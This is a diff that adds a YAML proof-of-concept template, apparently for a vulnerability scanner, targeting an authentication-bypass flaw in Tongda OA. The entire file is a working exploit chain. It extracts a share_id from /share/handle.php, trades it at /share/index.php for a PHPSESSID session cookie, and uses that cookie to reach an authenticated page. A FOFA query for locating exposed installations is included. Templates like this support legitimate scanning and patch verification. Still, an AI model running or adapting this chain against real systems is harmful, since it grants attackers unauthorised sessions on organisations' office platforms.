@@ -1,0 +1,26 @@
+id: poc-yaml-tongda-oa-share-authentication-bypass
+info:
+  name: 通达OA share 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /share/handle.php?module=2&module_id=1
+  expression: status_code == 200 && contains(body,"share_id=")
+  output:
+  - regex_match(body,`share_id=(?P<id>.*?)"`)
+- method: GET
+  path: /share/index.php?share_id={{.id}}
+  expression: status_code == 302
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>.*?);")
+- method: GET
+  path: /general/golog.php?version=ie6
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"images/golog/ie.png") && contains(body,"images/golog/spirit_icon.png")
+variables: {}
+transport: http
